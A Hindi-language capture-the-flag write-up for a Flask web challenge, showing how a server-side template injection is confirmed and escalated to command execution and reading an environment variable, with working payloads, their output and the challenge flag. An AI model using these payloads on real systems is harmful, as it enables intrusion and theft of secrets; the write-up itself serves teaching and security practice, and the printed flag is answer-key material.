# Shift-Left, Brain-Right

> **श्रेणी:** DevSecOps / Web · **इवेंट:** KubSTU CTF 2026 Autumn · **कठिनाई:** Medium

## 📌 कार्य

हे भगवान, नैनोसेकंड में $500k कमाने वाले इन vibe coder-ों से मैं बुरी तरह तंग आ गया हूँ... हमने अभी एक इंटर्न रखा जिसने हमारे लिए एक कोर्स-वेबसाइट बनाई। न सिर्फ़ उसका कुछ भी काम नहीं करता, बल्कि वह अब भी ज़िद पर अड़ा है कि यह एक उत्कृष्ट कृति है। मैंने उस पर एक SAST स्कैनर चलाया और एक बढ़िया रसीली भेद्यता पाई। चलो, इसे फोड़ डालो—बाद में मिलकर इस पर खूब हँसेंगे :)

फ़्लैग का प्रारूप: KubCTF{...}

**फ़ाइलें:** [app.py](../../../assets/Web/Shift-Left,%20Brain-Right/app.py) · [Dockerfile](../../../assets/Web/Shift-Left,%20Brain-Right/Dockerfile) · [report.json](../../../assets/Web/Shift-Left,%20Brain-Right/report.json)

## 🏁 समाधान

### 1. रिपोर्ट पढ़ना

रिपोर्ट में हमें यह पंक्ति दिखती है: `This is highly susceptible to Server-Side Template Injection (SSTI) and Cross-Site Scripting (XSS).`
हम SSTI आज़माते हैं।

### 2. SSTI की पुष्टि

```
GET /?course={{7*7}}
```

परिणाम-ब्लॉक में `49` लौटाया जाता है — इंजन ने अभिव्यक्ति (expression) का मूल्यांकन कर लिया।

### 3. Flask संदर्भ के ज़रिए RCE

`config` ऑब्जेक्ट टेम्पलेट में उपलब्ध है; `__class__.__init__.__globals__` के ज़रिए हम मॉड्यूल के ग्लोबल्स में निकलकर `os` तक पहुँचते हैं:

```
GET /?course={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

प्रतिक्रिया: `uid=1000(ctfuser) gid=1000(ctfuser) groups=1000(ctfuser)` — RCE मिल गया।

### 4. फ़्लैग पढ़ना

फ़्लैग को GZCTF प्लेटफ़ॉर्म `GZCTF_FLAG` पर्यावरण-चर में डाल देता है:

```
GET /?course={{config.__class__.__init__.__globals__['os'].environ['GZCTF_FLAG']}}
```

हमें यह प्रतिक्रिया मिलती है: `KubSTU{S46t_1s_C00l_TestTeamHash}`

**फ्लैग:** `KubSTU{S46t_1s_C00l_TestTeamHash}`
